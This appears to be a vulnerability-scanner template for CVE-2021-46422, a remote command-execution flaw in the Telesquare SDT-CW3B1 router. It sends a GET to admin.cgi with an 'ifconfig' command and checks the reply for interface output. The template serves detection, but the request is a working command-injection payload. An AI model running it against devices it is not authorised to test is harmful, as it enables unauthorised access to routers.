name: poc-yaml-telesquare-cve-2021-46422-rce
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig
        expression: |
            response.status == 200 && "inet addr:(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)  Bcast:(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)".bmatches(response.body)
expression: r0()
detail:
    author: z92g(https://github.com/z92g)
    links:
        - http://wiki.peiqi.tech/wiki/iot/Telesquare/Telesquare%20SDT-CW3B1%20admin.cgi%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-46422.html
    vulnerability:
        id: CT-417618
        level: critical
